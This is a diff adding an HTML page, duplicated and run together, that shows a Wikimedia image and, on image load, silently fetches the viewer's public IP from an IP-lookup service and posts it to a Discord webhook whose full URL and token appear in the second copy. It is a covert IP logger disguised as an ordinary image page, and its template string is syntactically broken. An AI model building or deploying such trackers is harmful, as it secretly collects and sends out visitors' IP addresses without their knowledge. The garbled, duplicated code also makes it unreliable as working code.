@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Image</title>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Image.jpg" onload="logIP()" alt="Tracked Image">
+  <script>
+    function logIP() {
+      const webhookUrl = 'Webhook.url';
+
+      // Usare un servizio esterno per ottenere l'IP dell'utente
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: IP: ${ip} viewed the image,
+            }),
+          });
+        })
+        .catch(error => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Image</title>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Image.jpg" onload="logIP()" alt="Tracked Image">
+  <script>
+    function logIP() {
+      const webhookUrl = 'https://discord.com/api/webhooks/1293505620049137725/Ucn1Na2MnBTcT3EJ908hjcu83v8styOzB3gcavlQ9Cvl_JljddNVjarQxYsxJlEiHPy0';
+
+      // Usare un servizio esterno per ottenere l'IP dell'utente
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: IP: ${ip} viewed the image,
+            }),
+          });
+        })
+        .catch(error => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
+
